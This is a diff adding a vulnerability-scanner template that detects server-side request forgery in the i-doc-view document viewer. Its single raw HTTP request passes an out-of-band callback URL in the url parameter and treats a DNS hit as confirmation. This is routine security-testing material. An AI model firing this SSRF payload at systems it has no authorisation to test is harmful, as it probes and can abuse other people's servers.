@@ -1,0 +1,22 @@
+id: i-doc-view-ssrf
+
+info:
+  name: i-doc-view-ssrf
+  author: msk
+  severity: high
+
+
+http:
+  - raw:
+      - |
+        GET /view/url?url=https://{{interactsh-url}} HTTP/1.1
+        Host: {{Hostname}}
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
+        Connection: close
+
+    matchers:
+      - type: word
+        part: interactsh_protocol # Confirms the DNS Interaction
+        words:
+          - "dns"
